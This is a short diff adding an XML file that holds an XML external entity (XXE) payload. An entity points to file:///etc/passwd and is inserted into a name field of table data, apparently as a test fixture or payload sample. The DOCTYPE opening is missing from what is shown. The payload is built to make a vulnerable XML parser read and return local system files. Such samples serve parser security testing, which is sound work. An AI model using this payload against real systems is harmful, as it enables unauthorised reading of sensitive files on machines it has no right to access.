@@ -1,0 +1,7 @@
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<table_data>
+     <table_row>
+          <name>&xxe;</name>
+          <nickname>mypass</nickname>
+     </table_row>
+</table_data>
